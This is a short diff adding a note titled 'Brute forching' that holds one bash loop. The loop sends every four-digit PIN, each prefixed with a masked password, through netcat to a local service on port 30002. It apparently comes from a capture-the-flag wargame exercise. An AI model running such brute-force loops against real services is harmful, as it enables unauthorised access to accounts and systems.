@@ -1,0 +1,3 @@
+# Brute forching
+
+for i in {0000..9999}; do echo "********* $i"; done | nc localhost 30002
